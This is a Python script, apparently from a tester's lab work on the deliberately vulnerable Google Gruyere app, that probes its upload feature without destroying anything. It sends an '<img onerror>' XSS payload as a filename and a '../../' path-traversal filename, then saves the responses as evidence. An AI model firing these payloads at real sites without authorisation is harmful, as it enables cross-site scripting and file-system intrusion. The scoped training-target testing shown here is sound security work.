#!/usr/bin/env python3
"""Round 6 (part 1) — 업로드 경로 비파괴 검증.

승인 대상(서버 파일 변조)은 실행하지 않는다. 여기서 하는 것은 전부 내 테스트 계정 범위:
  (1) 정상 업로드 1건 — 기능 동작/응답 형식 확인
  (2) 파일명에 HTML 페이로드 — {{url}} 무이스케이프 여부 확인 (내 디렉터리에 파일 1개 생성)
  (3) 존재하지 않는 디렉터리로 경로이탈 — IOError 메시지가 해석된 경로를 노출하는지 확인
      → 파일이 생성되지 않으므로 상태변경 없음(경로이탈 '능력' 증명용)
"""
import re
import subprocess
import sys
from pathlib import Path

SCRATCH = Path(__file__).resolve().parent.parent / "scratch"
GID = (SCRATCH / "gid.txt").read_text().strip()
if GID.startswith("GID="):
    GID = GID.split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = str(SCRATCH / "gruyere.cookies")
PX = ["-x", "http://127.0.0.1:8080", "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
EVID = Path(__file__).resolve().parent.parent / "evidence"


def curl(args, timeout=60):
    r = subprocess.run(["curl", "-s", *PX, "-b", JAR, "-c", JAR, *args],
                       capture_output=True, text=True, timeout=timeout)
    return r.stdout


def login():
    body = curl([f"{BASE}/login?uid=brie&pw=briebrie"])
    print(f"[login] brie 재로그인 ({len(body)}B)")


def upload(filename, data=b"round6 probe\n"):
    """multipart 업로드. filename 을 그대로 지정한다(경로이탈 시험의 핵심)."""
    tmp = SCRATCH / "round6_payload.bin"
    tmp.write_bytes(data)
    return curl(["-D", "-", "-F", f"upload_file=@{tmp};filename={filename}",
                 f"{BASE}/upload2"], timeout=60)


def main():
    login()
    out = []

    # (1) 정상 업로드 — 내 디렉터리 안
    r = upload("round6_probe.txt")
    m = re.search(r"File accessible at:</b>\s*(\S+)", r)
    out.append(("(1) 정상 업로드", f"status={'200' if 'Upload Complete' in r else '?'}",
                f"url={m.group(1) if m else '(없음)'}"))

    # (2) 파일명에 HTML — {{url}} 이스케이프 여부
    payload = "<img src=x onerror=\"document.title='UPLOAD-FILENAME-XSS'\">"
    r2 = upload(payload + ".txt")
    if payload in r2:
        out.append(("(2) 파일명 HTML 반사", "이스케이프 없이 원문 반사 ❗",
                    re.search(r"File accessible at:</b>\s*(\S+)", r2).group(1)[:120] if "File accessible" in r2 else ""))
    else:
        out.append(("(2) 파일명 HTML 반사", "이스케이프됨", r2[:200]))

    # (3) 경로이탈 '능력' 증명 — 존재하지 않는 디렉터리 → IOError, 파일 생성 없음
    r3 = upload("../../zzz_no_such_dir_round6/probe.txt")
    msg = re.search(r"class='message'>(.*?)</div>", r3, re.S)
    out.append(("(3) 경로이탈 오류메시지", "경로 노출" if msg else "메시지 없음",
                (msg.group(1).strip()[:200] if msg else r3[:200])))

    print()
    for label, verdict, detail in out:
        print(f"{label}\n   판정: {verdict}\n   {detail}\n")

    EVID.mkdir(exist_ok=True)
    (EVID / "round6_upload_nondestructive.txt").write_text(
        "\n\n".join(f"### {l}\n판정: {v}\n{d}" for l, v, d in out) + "\n\n"
        + "### (1) 원문\n" + r + "\n\n### (3) 원문\n" + r3, encoding="utf-8")
    print(f"증거 저장: {EVID / 'round6_upload_nondestructive.txt'}")


if __name__ == "__main__":
    main()
